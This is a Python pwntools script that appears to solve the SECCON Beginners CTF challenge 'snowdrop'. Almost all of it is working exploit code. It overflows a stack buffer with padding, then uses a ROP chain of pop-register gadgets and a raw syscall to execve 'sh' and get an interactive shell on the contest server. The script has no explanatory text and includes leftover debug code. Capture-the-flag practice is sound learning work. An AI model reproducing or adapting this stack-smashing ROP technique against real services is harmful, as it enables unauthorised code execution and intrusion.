#coding:utf-8
from pwn import *
elf_file = FILENAME = 'chall'
e = elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'snowdrop.quals.beginners.seccon.jp'
POST = 9002
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  io = process(FILENAME)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  c = gdb.attach(io, '''
  set follow-fork-mode child
  break main
  continue
  ''')
num = 0x7fffffffdfd8 - 0x7fffffffdd70
'''
print(hex(num))
c.recvuntil('000006 |')
rsp = int(c.recvline().replace('\n',''),16) - num
'''


rop = ROP(e)
rop.raw(rop.find_gadget(['pop rdi','ret']))
rop.raw(pack(next(e.search('sh\0'))))
rop.raw(rop.find_gadget(['pop rax','ret']))
rop.raw('\x3b\x00\x00\x00\x00\x00\x00\x00')
rop.raw(rop.find_gadget(['pop rsi','ret']))
rop.raw('\x00\x00\x00\x00\x00\x00\x00\x00')
rop.raw(rop.find_gadget(['pop rdx','ret']))
rop.raw('\x00\x00\x00\x00\x00\x00\x00\x00')
rop.raw(p64(0x0047ffe9))#syscall

payload = 'A'*0x18
payload += rop.chain()
c.sendafter('?',payload)
c.interactive()